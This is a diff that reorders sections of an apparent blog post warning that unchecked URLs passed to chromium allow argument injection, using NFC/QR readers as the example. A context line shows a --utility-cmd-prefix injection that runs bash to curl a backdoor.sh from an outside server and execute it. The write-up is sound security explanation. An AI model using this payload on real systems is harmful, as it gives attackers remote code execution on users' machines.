@@ -38,6 +38,16 @@ What happens is user just got compromised...
 chromium --utility-cmd-prefix='bash -c \" ls . ; curl http://someserver/backdoor.sh > backdoor.sh ; bash backdoor.sh ; ls . \"'
 ```
 
+To understand how big of issue this is I suggest reading [my post about command arguments](https://nemanja.top/2022/05/01/why-argv-sucks-for-users).
+
+## Real danger example 1 (NFC/QRcode)
+
+Now imagine you have just implemented NFC or QRcode reader...
+
+You did not check url format, you passed it to chromium as url...
+
+![](/assets/rfid.png)
+
 Example vulnerable code:
 
 ```javascript
@@ -68,16 +78,6 @@ spawn("nfc-mfultralight", ["r", "dump"]).on("close", () => {
 	});
 });
 ```
-
-To understand how big of issue this is I suggest reading [my post about command arguments](https://nemanja.top/2022/05/01/why-argv-sucks-for-users).
-
-## Real danger example 1 (NFC/QRcode)
-
-Now imagine you have just implemented NFC or QRcode reader...
-
-You did not check url format, you passed it to chromium as url...
-
-![](/assets/rfid.png)
 
 ## Real danger example 2 (RSS reader/Mail client)
 
